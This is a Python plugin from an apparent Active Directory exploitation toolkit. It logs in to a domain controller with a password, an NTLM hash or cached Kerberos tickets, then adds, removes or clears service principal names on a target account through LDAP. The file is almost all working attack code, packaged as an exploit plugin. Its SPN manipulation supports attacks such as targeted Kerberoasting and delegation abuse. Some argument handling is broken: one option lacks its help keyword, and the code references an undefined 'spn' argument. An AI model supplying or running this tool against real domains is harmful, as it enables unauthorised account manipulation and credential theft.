import argparse
import os
import sys
from copy import copy

import ldap3
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import getKerberosTGT
from ldap3.protocol.microsoft import security_descriptor_control

from plugins.AD import PluginAdExploitBase
from utils import output
from utils.consts import AllPluginTypes

import datetime
from pyasn1.type.univ import noValue
from pyasn1.codec.der import decoder, encoder
from ldap3 import Server, Connection, NTLM, ALL, SASL, KERBEROS
from ldap3.operation.bind import bind_operation
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
from impacket.krb5.asn1 import AP_REQ, Authenticator, TGS_REP, seq_set

from impacket.krb5.types import Principal, KerberosTime, Ticket
from impacket.krb5 import constants
from impacket.krb5.kerberosv5 import getKerberosTGS


class PluginADAddSPN(PluginAdExploitBase):
    display = "添加SPN"
    alias = "add_spn"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.description = self.display

        parser.add_argument("-d", "--domain", help="dc fqdn (dc01.test.lab)", required=True, dest="domain")
        parser.add_argument("-u", "--username", help="username", required=True, dest="username")
        parser.add_argument("-p", "--password", help="password", required=False, dest="password")
        parser.add_argument("--dc-ip", help="domain ip address", required=False, dest="dc_ip")
        parser.add_argument("-t", "--target", help="Computername or username to target (sAMAccountName)",
                            required=True,
                            dest="target")

        tgroup = parser.add_argument_group("search")
        tgroup.add_argument("-r", "--remove", help="remove the SPN", required=False, dest="remove")
        tgroup.add_argument("-a", "--add", help="add the SPN", required=False, dest="add")
        tgroup.add_argument("--additional", "Add the SPN via the msDS-AdditionalDnsHostName attribute", required=False, dest="additional")
        tgroup.add_argument("-c", "--clear", help="clear all SPNs", action=argparse.BooleanOptionalAction,
                            required=False, default=False, dest="clear")
        tgroup.add_argument("-q", "--query", help="Show the current target SPNs", action=argparse.BooleanOptionalAction,
                            required=False, default=False, dest="query")

        agroup = parser.add_argument_group('authentication')

        agroup.add_argument("--hash", help='NTLM hashes, format is LMHASH:NTHASH', required=False,
                            metavar="LMHASH:NTHASH", dest="hash")
        agroup.add_argument("-k",
                            help="Use Kerberos authentication. Grabs credentials from ccache file "
                                 "(KRB5CCNAME) based on target parameters. If valid credentials cannot be "
                                 "found, it will use the "
                                 "ones specified in the command line", action=argparse.BooleanOptionalAction,
                            default=False,
                            required=False, dest="do_kerb")

    def run_script(self, args) -> dict:
        """
        脚本入口函数
        :return: bool
        """
        result = copy(self.result)

        _domain_fqdn: str = args.domain
        _domain_name = ".".join(_domain_fqdn.split(".")[-2:])
        _dc_ip = args.dc_ip
        _username = args.username
        _password = args.password
        _target = args.target

        _remove = args.remove
        _add = args.add
        _clear = args.clear
        _query = args.query

        _hash = args.hash
        _do_kerb = args.do_kerb

        TGT = None
        TGS = None
        try:
            # Hashes
            lmhash, nthash = _hash.split(':')
            assert len(nthash) == 32
            password = ''
        except:
            # Password
            lmhash = ''
            nthash = ''
            password = _password
        if 'KRB5CCNAME' in os.environ and os.path.exists(os.environ['KRB5CCNAME']):
            _, _, TGT, TGS = CCache.parseFile(_domain_name, _username, 'ldap/%s' % _domain_fqdn)

        if _dc_ip is None:
            kdcHost = _domain_name
        else:
            kdcHost = _dc_ip

        userName = Principal(_username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        if not TGT and not TGS:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, password, _domain_name, lmhash, nthash,
                                                                    None, kdcHost)
        elif TGT:
            # Has TGT
            tgt = TGT['KDC_REP']
            cipher = TGT['cipher']
            sessionKey = TGT['sessionKey']
        if not TGS:
            # Request TGS
            serverName = Principal('ldap/%s' % _domain_fqdn, type=constants.PrincipalNameType.NT_SRV_INST.value)
            TGS = getKerberosTGS(serverName, _domain_name, kdcHost, tgt, cipher, sessionKey)
        else:
            # Convert to tuple expected
            TGS = (TGS['KDC_REP'], TGS['cipher'], TGS['sessionKey'], TGS['sessionKey'])
        authentication = SASL
        sasl_mech = KERBEROS

        controls = security_descriptor_control(sdflags=0x04)
        # define the server and the connection
        s = Server(_domain_fqdn, get_info=ALL)
        output.info('Connecting to host...')
        c = Connection(s, user=_username, password=_password, authentication=authentication,
                       sasl_mechanism=sasl_mech)
        output.info('Binding to host')
        # perform the Bind operation
        if authentication == NTLM:
            if not c.bind():
                output.info('Could not bind with specified credentials')
                output.info(c.result)
                sys.exit(1)
        else:
            ldap_kerberos(_domain_name, kdcHost, None, userName, c, _domain_fqdn, TGS)
        output.success('Bind OK')

        search = '(SAMAccountName=%s)' % _target
        c.search(s.info.other['defaultNamingContext'][0], search, controls=controls,
                 attributes=['SAMAccountName', 'servicePrincipalName', 'dnsHostName', 'msds-additionaldnshostname'])

        try:
            targetobject = c.entries[0]
            output.success("Found modification target")
        except IndexError:
            output.error("Target not found!")
            return result

        spn = ""
        if _remove:
            operation = ldap3.MODIFY_DELETE
            spn = _remove
        elif _clear:
            operation = ldap3.MODIFY_REPLACE
        else:
            operation = ldap3.MODIFY_ADD
            spn = _add

        if _query:
            # If we only want to query it
            output.success(f"query result: \n"
                           f"{'':^4}{targetobject}")
            return result

        if not args.additional:
            if _clear:
                output.info(f"Printing object before clearing\n"
                            f"{'':^4}{targetobject}")
                c.modify(targetobject.entry_dn, {'servicePrincipalName': [(operation, [])]})
            else:
                c.modify(targetobject.entry_dn, {'servicePrincipalName': [(operation, [spn])]})
        else:
            try:
                host = args.spn.split('/')[1]
            except IndexError:
                # Assume this is the hostname
                host = args.spn
            c.modify(targetobject.entry_dn, {'msds-additionaldnshostname': [(operation, [host])]})

        if c.result['result'] == 0:
            output.success('SPN Modified successfully')
        else:
            if c.result['result'] == 50:
                output.info('Could not modify object, the server reports insufficient rights: %s' % c.result['message'])
            elif c.result['result'] == 19:
                output.info('Could not modify object, the server reports a constrained violation')
                if args.additional:
                    output.info(
                        'You either supplied a malformed SPN, or you do not have access rights to add this SPN (Validated write only allows adding SPNs ending on the domain FQDN)')
                else:
                    output.info(
                        'You either supplied a malformed SPN, or you do not have access rights to add this SPN (Validated write only allows adding SPNs matching the hostname)')
                    output.info(
                        'To add any SPN in the current domain, use --additional to add the SPN via the msDS-AdditionalDnsHostName attribute')
            else:
                output.info('The server returned an error: %s' % c.result['message'])

        return result


def ldap_kerberos(domain, kdc, tgt, username, ldapconnection, hostname, tgs=None):
    gssapi_data = build_apreq(domain, kdc, tgt, username, 'ldap', hostname, tgs)

    return ldap_kerberos_auth(ldapconnection, gssapi_data)


def build_apreq(domain, kdc, tgt, username, serviceclass, hostname, tgs=None):
    # Build a protocol agnostic AP-REQ using the TGT we have, wrapped in GSSAPI/SPNEGO
    username = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    servername = Principal('%s/%s' % (serviceclass, hostname), type=constants.PrincipalNameType.NT_SRV_INST.value)
    if tgs:
        # If the TGS is already supplied, use that instead of TGT
        tgs, cipher, _, sessionkey = tgs
    else:
        tgs, cipher, _, sessionkey = getKerberosTGS(servername, domain, kdc,
                                                    tgt['KDC_REP'], tgt['cipher'], tgt['sessionKey'])

    # Let's build a NegTokenInit with a Kerberos AP_REQ
    blob = SPNEGO_NegTokenInit()

    # Kerberos
    blob['MechTypes'] = [TypesMech['MS KRB5 - Microsoft Kerberos 5']]

    # Let's extract the ticket from the TGS
    tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
    ticket = Ticket()
    ticket.from_asn1(tgs['ticket'])

    # Now let's build the AP_REQ
    apReq = AP_REQ()
    apReq['pvno'] = 5
    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

    opts = []
    apReq['ap-options'] = constants.encodeFlags(opts)
    seq_set(apReq, 'ticket', ticket.to_asn1)

    authenticator = Authenticator()
    authenticator['authenticator-vno'] = 5
    authenticator['crealm'] = domain
    seq_set(authenticator, 'cname', username.components_to_asn1)
    now = datetime.datetime.utcnow()

    authenticator['cusec'] = now.microsecond
    authenticator['ctime'] = KerberosTime.to_asn1(now)

    encodedAuthenticator = encoder.encode(authenticator)

    # Key Usage 11
    # AP-REQ Authenticator (includes application authenticator
    # subkey), encrypted with the application session key
    # (Section 5.5.1)
    encryptedEncodedAuthenticator = cipher.encrypt(sessionkey, 11, encodedAuthenticator, None)

    apReq['authenticator'] = noValue
    apReq['authenticator']['etype'] = cipher.enctype
    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

    blob['MechToken'] = encoder.encode(apReq)
    return blob.getData()

def ldap_kerberos_auth(ldapconnection, authdata_gssapi):
    # Hackery to authenticate with ldap3 using impacket Kerberos stack
    # I originally wrote this for BloodHound.py, but it works fine (tm) here too
    ldapconnection.open(read_server_info=False)
    request = bind_operation(ldapconnection.version, SASL, None, None, ldapconnection.sasl_mechanism, authdata_gssapi)
    response = ldapconnection.post_send_single_response(ldapconnection.send('bindRequest', request, None))[0]
    ldapconnection.result = response
    if response['result'] == 0:
        ldapconnection.bound = True
        ldapconnection.refresh_server_info()
    return response['result'] == 0